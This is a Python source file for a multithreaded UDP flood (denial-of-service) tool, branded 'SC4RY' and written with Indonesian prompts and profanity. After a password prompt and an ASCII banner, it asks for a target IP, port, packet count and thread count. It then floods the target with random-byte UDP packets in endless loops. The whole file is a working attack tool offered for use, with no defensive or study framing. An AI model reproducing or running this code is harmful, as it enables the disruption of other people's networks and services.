import random
import socket
import threading
import sys
import os
import signal
import time
from os import system, name

os.system("clear")
password ="SC4RY"

for i in range(3):
	pwd = input("\033[93m> Masukan Password : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("\033[92mSabar Tod")
		break
	else:
		time.sleep(5)
		print("\033[91m> [×] Password Nya Salah Tod")
		continue
time.sleep(5)
print("\033[94m> [✓] Password Benar Tod")

os.system("clear")
print("\033[1m Tools By SC4RY")
print("------------------------------------------------")
print("[+] Tools Used By : SC4RY")
print("[+] Credit Tools : Lordzz,SC4RY")
print("[+] Jangan Abuse Ya Kontol")
print("------------------------------------------------")

print("""\033[31m

███████╗ ██████╗██╗  ██╗██████╗ ██╗   ██╗
██╔════╝██╔════╝██║  ██║██╔══██╗╚██╗ ██╔╝
███████╗██║     ███████║██████╔╝ ╚████╔╝ 
╚════██║██║     ╚════██║██╔══██╗  ╚██╔╝  
███████║╚██████╗     ██║██║  ██║   ██║   
╚══════╝ ╚═════╝     ╚═╝╚═╝  ╚═╝   ╚═╝   
                                         

                                  """)


ip = str(input(" [ / ]  Target IP      ====> :"))
port = int(input(" [ / ]  Target Port  ====> :"))
choice = str(input(" [ / ]  (y/n)      ====> :"))
times = int(input(" [ / ]  Packets     ====> :"))
threads = int(input(" [ / ]  Threads   ====> :"))


def run():
    data = random._urandom(915)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Attack By SC4RY !!!")
        except:
            print("[*] Attack By SC4RY !!!")

def run2():
    data = random._urandom(1024)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attack By SC4RY !!!")
        except:
            s.close()
            print("[*] Attack By SC4RY !!!")
            
def run3():
    data = random._urandom(1800)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attack By SC4RY !!!")
        except:
            s.close()
            print("[*] Attack By SC4RY !!!")

for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
        th = threading.Thread(target = run2)
        th.start()
    else:
        th = threading.Thread(target = run3)
        th.start()
